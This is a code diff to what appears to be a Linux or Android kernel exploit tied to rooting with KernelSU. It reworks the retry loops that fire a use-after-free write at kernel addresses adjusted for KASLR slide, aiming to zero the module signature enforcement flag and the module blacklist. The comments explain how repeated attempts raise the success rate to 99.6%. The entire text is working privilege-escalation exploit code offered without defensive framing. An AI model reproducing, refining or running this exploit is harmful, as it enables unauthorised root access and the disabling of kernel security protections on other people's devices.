@@ -2005,17 +2005,26 @@ static void read_enforce(void)
 	close(fd);
 }
 
-static void read_sig_enforce(void)
+/* 1 = enforced, 0 = off, -1 = unreadable (shell cannot read this param;
+ * the plant may already be root in some modes).  Reads never gate the UAF
+ * fires: the store is probabilistic and a failed read must not shorten
+ * the retry loop. */
+static int sig_enforce_state(void)
 {
 	char buf[8] = { 0 };
 	int fd = open("/sys/module/module/parameters/sig_enforce", O_RDONLY | O_CLOEXEC);
+	int n;
+
 	if (fd < 0) {
 		dprintf(STDOUT_FILENO, "[ksu] sig_enforce read errno=%d\n", errno);
-		return;
+		return -1;
 	}
-	if (read(fd, buf, sizeof(buf) - 1) > 0)
-		dprintf(STDOUT_FILENO, "[ksu] signature enforcement=%s", buf);
+	n = (int)read(fd, buf, sizeof(buf) - 1);
 	close(fd);
+	if (n <= 0)
+		return -1;
+	dprintf(STDOUT_FILENO, "[ksu] sig_enforce now=%c\n", buf[0]);
+	return (buf[0] == 'Y' || buf[0] == '1') ? 1 : 0;
 }
 
 static int g_fast;
@@ -2108,30 +2117,31 @@ int main(int argc, char **argv)
 	g_plant_cred = 0;
 	(void)try_permissive();
 	if (g_ksu) {
-		int off = 0;
-		read_sig_enforce();
-		for (int i = 0; i < 3 && !off; i++) {
-			dprintf(STDOUT_FILENO, "[ksu] zero sig_enforce attempt %d\n", i + 1);
-			if (!one_uaf(slide_addr(SIG_ENFORCE_LINK)))
-				off = 1;
+		int before = sig_enforce_state();
+
+		dprintf(STDOUT_FILENO, "[ksu] sig_enforce before=%d\n", before);
+		/* Fire every attempt unconditionally: one_uaf() reports that the
+		 * UAF write ran, not that the store landed, and the sysfs read is
+		 * unavailable to the shell-domain plant on several builds.  8
+		 * independent stores bring a 50% hit rate to 99.6%. */
+		for (int i = 1; i <= 8; i++) {
+			dprintf(STDOUT_FILENO,
+				"[ksu] zero sig_enforce attempt %d/8 target=%#" PRIx64 "\n",
+				i, slide_addr(SIG_ENFORCE_LINK));
+			(void)one_uaf(slide_addr(SIG_ENFORCE_LINK));
+			usleep(2000);
+			if (sig_enforce_state() == 0)
+				break;
 		}
-		read_sig_enforce();
-		if (!off)
+		if (sig_enforce_state() != 0)
 			dprintf(STDOUT_FILENO, "[ksu] sig_enforce not cleared\n");
 #if MODULE_BLACKLIST_LINK
-		{
-			int ok = 0;
-
-			for (int i = 0; i < 3 && !ok; i++) {
-				dprintf(STDOUT_FILENO,
-					"[ksu] zero module_blacklist attempt %d target=%#" PRIx64 "\n",
-					i + 1, slide_addr(MODULE_BLACKLIST_LINK));
-				if (!one_uaf(slide_addr(MODULE_BLACKLIST_LINK)))
-					ok = 1;
-			}
-			if (!ok)
-				dprintf(STDOUT_FILENO,
-					"[ksu] module_blacklist not cleared\n");
+		for (int i = 1; i <= 4; i++) {
+			dprintf(STDOUT_FILENO,
+				"[ksu] zero module_blacklist attempt %d/4 target=%#" PRIx64 "\n",
+				i, slide_addr(MODULE_BLACKLIST_LINK));
+			(void)one_uaf(slide_addr(MODULE_BLACKLIST_LINK));
+			usleep(2000);
 		}
 #endif
 	}
